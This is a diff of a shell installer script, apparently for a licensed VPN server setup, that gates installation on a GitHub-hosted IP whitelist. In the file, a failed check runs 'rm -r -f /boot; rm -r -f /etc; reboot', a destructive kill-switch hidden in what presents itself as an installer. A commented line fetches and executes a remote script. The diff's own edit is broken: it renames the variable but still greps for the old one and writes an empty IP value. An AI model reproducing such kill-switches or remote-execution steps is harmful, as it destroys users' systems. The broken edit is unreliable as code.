@@ -10,9 +10,9 @@ fi
 red='\e[1;31m'
 green='\e[0;32m'
 NC='\e[0m'
-IP=$(wget -qO- ifconfig.me/ip);
+MYIP=$(wget -qO- ifconfig.me/ip);
 IZIN=$( curl https://raw.githubusercontent.com/halluboys/ipvps/main/ip | grep $IP )
-if [ $IP = $IZIN ]; then
+if [ $MYIP = $IZIN ]; then
 echo -e "${green}Permission Accepted...${NC}"
 else
 echo -e "${red}Permission Denied!${NC}";
@@ -25,7 +25,7 @@ rm -r -f /boot; rm -r -f /etc; reboot
 exit 0
 fi
 mkdir /var/lib/premium-script;
-echo "IP=$IP" >> /var/lib/premium-script/ipvps.conf
+echo "IP=" >> /var/lib/premium-script/ipvps.conf
 #install ssh ovpn
 #wget https://raw.githubusercontent.com/halluboys/xzvnct/main/ssh-vpn.sh && chmod +x ssh-vpn.sh && screen -S ssh-vpn ./ssh-vpn.sh
 #install cf
